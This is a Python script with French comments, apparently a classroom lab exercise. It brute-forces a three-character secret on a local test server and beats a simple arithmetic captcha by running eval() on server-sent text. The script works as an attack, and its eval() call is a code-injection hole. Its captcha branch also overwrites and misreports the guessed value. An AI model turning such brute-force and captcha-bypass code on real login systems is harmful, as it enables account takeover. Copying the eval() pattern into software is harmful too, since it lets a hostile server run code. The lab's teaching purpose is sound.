#!/usr/bin/env python3
import requests
import itertools
import time

# ---------------- Configuration par défaut ----------------
SERVER_URL = "http://127.0.0.1:5000"

# ---------------- Fonctions utilitaires ----------------
# Envoi d'une réponse au serveur web
def send_answer(session_id, attempt, captcha_id=None, captcha_answer=None):
    payload = {
        "session_id": session_id,
        "attempt": attempt
    }
    if captcha_id:
        payload["captcha_id"] = captcha_id
        payload["captcha_answer"] = captcha_answer
    r = requests.post(f"{SERVER_URL}/attempt", json=payload)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text

# Récupération d'une nouvelle session
def api_new_session(tp, class_key, server_url=SERVER_URL):
    payload = {"tp": tp, "class_key": class_key}
    r = requests.post(f"{server_url}/new_session", json=payload)
    if r.status_code in (200, 201):
        j = r.json()
        return j.get("session_id")
    else:
        raise RuntimeError(f"Erreur création session {r.status_code}: {r.text}")
        
# ------ TP3: Bruteforce + captcha tous les 300 essais ------
def bruteforce(session_id):
    # Même principe que TP2 mais gère challenge captcha renvoyé par serveur
    charset = "0123456789abcdefghijklmnopqrstuvwxyz"
    length = 3
    for idx, tpl in enumerate(itertools.product(charset, repeat=length)):
        answer = ''.join(tpl)
        status, resp = send_answer(session_id, answer)
        if status == 200 and isinstance(resp, dict):
            if resp.get("captcha_required"):
                captcha_id = resp["captcha_id"]
                question = resp["question"]
                print("Captcha demandé :", question)
                answer = eval(question.split("=")[0].strip())
                print("Réponse captcha calculée :", answer)
                status2, resp2 = send_answer(session_id, answer, captcha_id=captcha_id, captcha_answer=str(answer))
                if status2 == 200 and isinstance(resp2, dict) and resp2.get("success") is True:
                    print("Trouvé après captcha :", answer)
                    return answer
            elif resp.get("success") is True:
                print("Trouvé:", answer)
                return answer
        elif status == 403:
            print("Rejet (403) - Probablement un mauvais captcha :", resp)
        time.sleep(0.001)
    print("Non trouvé.")
    return None

if __name__ == "__main__":
    session = api_new_session(3, "0ter1a_s3cr3t", server_url=SERVER_URL)    
    bruteforce(session)

# Conclusion
# N'essayez pas de réinventer la roue en implémentant votre propre système de captcha, généralement, ça ne marche pas
# On va plutôt essayer de mettre en place des captchas comme reCaptcha etc...
# ATTENTION : Même ces captchas ne sont pas imperméables, certains sites vendent des robots capable de les contourner